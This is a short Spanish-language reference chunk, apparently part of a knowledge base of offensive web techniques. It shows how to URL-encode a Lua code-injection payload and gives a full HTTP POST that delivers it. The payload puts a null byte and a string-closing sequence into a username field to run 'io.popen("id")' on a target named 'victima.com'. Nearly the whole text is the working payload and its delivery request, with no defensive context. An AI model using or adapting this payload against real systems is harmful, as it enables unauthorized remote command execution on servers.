---
chunk_id: reference::web::url-encoding::http-request::001
domain: reference
chunk_type: technique
---

### ¿Cómo se ve esto en una petición HTTP? (URL Encoded)

Como mencionaste al principio, estos payloads no se envían así "limpios". Se deben codificar para que los caracteres especiales (como los espacios, las comillas o el símbolo `#`) no rompan la URL.

**Ejemplo del primer payload (`id`) codificado:**

`anonymous%00%5D%5D%0Alocal%20h%20%3D%20io.popen%28%22id%22%29%0Alocal%20r%20%3D%20h%3Aread%28%22%2Aa%22%29%0Ah%3Aclose%28%29%0Aprint%28r%29%0A--`

Aquí tienes un HTTP POST real:

```http
POST /vulnerable-app/config HTTP/1.1
Host: victima.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154

username=anonymous%00%5D%5D%0Alocal%20h%20%3D%20io.popen%28%22id%22%29%0Alocal%20r%20%3D%20h%3Aread%28%22%2Aa%22%29%0Ah%3Aclose%28%29%0Aprint%28r%29%0A--
```
